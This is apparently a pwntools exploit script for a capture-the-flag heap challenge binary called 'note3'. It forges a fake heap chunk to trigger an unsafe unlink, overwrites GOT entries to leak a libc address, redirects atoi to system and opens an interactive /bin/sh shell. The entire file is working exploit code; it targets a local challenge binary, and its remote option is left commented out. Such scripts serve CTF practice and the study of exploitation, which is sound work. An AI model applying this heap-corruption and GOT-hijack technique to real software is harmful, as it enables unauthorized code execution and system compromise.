from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./note3"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("option--->>\n",str(idx))

def add(length,content):
    opt(1)
    p.sendlineafter("Input the length of the note content:(less than 1024)\n",str(length))
    p.sendlineafter("Input the note content:\n",str(content))

def free(idx):
    opt(4)
    p.sendlineafter("Input the id of the note:\n",str(idx))

def edit(idx,content):
    opt(3)
    p.sendlineafter("Input the id of the note:\n",str(idx))
    p.sendlineafter("Input the new content:\n",str(content))

x = 0x6020c8
fake_fd = x-0x18
fake_bk = x-0x10
fake_next_prev = 0x20

payload = flat([
    0,0x20,
    fake_fd,fake_bk,
    fake_next_prev
    ])

add(0x50,payload)
add(0x10,"b"*0x10)
add(0x80,"c"*0x30)
free(1)
payload = flat([
    0,0,
    0x70,0x90,
    0,0
    ])
add(0,payload)
free(2)
edit(0,"a"*0x18+p64(elf.got["atoi"])+p64(elf.got["free"])+p64(elf.got["atoi"]))
edit(1,p64(elf.plt["puts"])[:-1])
free(0)
atoi_addr = u64(p.recv(6).ljust(8,"\0"))
system_addr = atoi_addr - libc.sym["atoi"] + libc.sym["system"]
edit(2,p64(system_addr)[:-1])
p.sendline("/bin/sh\x00")
# gdb.attach(p,"set $h=0x603000,$g=0x6020C0")

p.interactive()
